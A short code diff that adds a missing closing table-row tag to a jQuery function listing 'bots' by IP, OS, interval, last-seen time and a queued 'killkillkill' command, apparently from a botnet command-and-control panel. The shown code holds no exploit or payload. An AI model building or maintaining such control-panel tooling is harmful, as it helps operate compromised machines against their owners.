@@ -19,7 +19,7 @@ function clients_list(){
             var check = $('input:checkbox[name=botcb]:checked').get();
             $("#tb").html("");
             $.each(data, function(i, bot) {
-                $("#tb").append('<tr id="row' + i + '"><td><input type="checkbox" name="botcb" value="' + i + '"> ' + i + "</td><td>" + bot.IP + "</td><td>" + bot.OS + "</td><td id=\"intervaltd\">" + bot.set_interval + "</td><td>" + Math.round(bot.last_seen) + "</td>");
+                $("#tb").append('<tr id="row' + i + '"><td><input type="checkbox" name="botcb" value="' + i + '"> ' + i + "</td><td>" + bot.IP + "</td><td>" + bot.OS + "</td><td id=\"intervaltd\">" + bot.set_interval + "</td><td>" + Math.round(bot.last_seen) + "</td></tr>");
                 if ($.inArray('killkillkill', bot.cmd_queue) == -1){
                     $("#row"+i).dblclick(function(e){
                         e.preventDefault();
